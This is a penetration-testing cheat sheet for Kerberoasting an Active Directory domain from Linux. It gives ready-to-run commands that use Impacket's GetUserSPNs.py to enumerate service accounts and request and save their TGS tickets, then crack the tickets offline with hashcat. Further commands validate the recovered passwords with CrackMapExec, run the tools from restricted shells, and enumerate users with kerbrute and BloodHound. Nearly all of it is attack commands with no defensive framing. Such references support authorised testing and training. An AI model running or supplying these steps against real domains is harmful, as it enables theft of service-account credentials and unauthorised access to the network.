# Kerberoasting - from Linux

## Help

```bash
GetUserSPNs.py -h
```

## List SPNs

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

## Request TGS Tickets (all)

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
```

## Request TGS Ticket (specific user)

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER>
```

## Request and Save TGS Ticket

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER> -outputfile <OUTPUT_FILE>
```

---

## Hashcat

```bash
hashcat -m 13100 <TGS_FILE> <WORDLIST>
hashcat -m 13100 <TGS_FILE> <WORDLIST> --force
hashcat -m 13100 <TGS_FILE> <WORDLIST> -o <CRACKED_FILE>
```

---

## CrackMapExec

```bash
sudo crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

---

## Verify TGS Hash Files

```bash
strings <TGS_FILE> | head
hexdump -C <TGS_FILE> | less
```

---

## Running in Restricted Shells

```bash
python3 -c "import os; os.system('GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>')"
```

```bash
nohup python3 GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request &
```

---

## Alternative SPN Enumeration Tools

### kerbrute

```bash
./kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
```

### BloodHound

```bash
neo4j console &
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c All
```
